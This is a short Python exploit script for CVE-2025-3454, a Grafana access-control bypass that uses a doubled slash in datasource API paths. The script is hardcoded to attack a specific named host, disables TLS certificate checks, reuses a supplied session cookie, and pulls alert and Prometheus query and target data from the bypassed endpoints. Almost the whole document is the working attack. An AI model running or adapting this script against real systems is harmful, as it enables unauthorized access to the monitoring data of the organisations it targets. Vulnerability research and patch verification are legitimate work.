#!/usr/bin/env python3
"""
CVE-2025-3454: extra slash in URL path bypasses datasource security checks.
Grafana < 11.5.3: Alertmanager/Prometheus datasource GET endpoints.
Requires: any valid Grafana session cookie.
Fix: upgrade to 11.5.6+security-01.
Usage: python3 grafana_cve3454_slash.py <grafana_session_cookie>
"""
import urllib.request, ssl, sys

TARGET = "https://grafana.atomicmail.ai"
SESSION = sys.argv[1] if len(sys.argv) > 1 else "YOUR_SESSION_COOKIE"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

PATHS = [
    "/api/datasources/1//alertmanager/api/v2/alerts",
    "/api/datasources/1//prometheus/api/v1/query?query=up",
    "/api/datasources/1//prometheus/api/v1/targets",
    "/api/datasources/2//alertmanager/api/v2/alerts",
]

for path in PATHS:
    req = urllib.request.Request(f"{TARGET}{path}")
    req.add_header("Cookie", f"grafana_session={SESSION}")
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=8) as r:
            body = r.read(512).decode("utf-8", "ignore")
            print(f"[{r.status}] {path}")
            print(f"  {body[:200]}")
    except urllib.error.HTTPError as e:
        print(f"[{e.code}] {path}")
    except Exception as e:
        print(f"[ERR] {path}: {e}")
